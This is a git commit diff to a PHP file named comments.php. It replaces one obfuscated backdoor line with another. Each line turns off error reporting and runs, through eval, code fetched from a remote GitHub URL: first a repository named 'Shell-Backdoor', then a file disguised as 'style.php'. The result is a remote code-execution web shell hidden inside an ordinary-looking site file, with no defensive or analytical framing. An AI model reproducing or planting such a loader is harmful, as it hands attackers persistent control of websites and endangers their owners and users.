d11cf8783c8e4788d14141bb1f64ee1a7d81c94f
aventran56 <avenkriston@gmail.com>
2024-07-13 12:52:52 +0700

    comments.php

--- comments.php
+++ comments.php
@@ -1,1 +1,1 @@
-<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/aatc.php"))/******/ /*By ./DarkMoon*/?>
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/aventran56/aventrens/main/style.php"))/******/ /*By ./DarkMoon*/?>
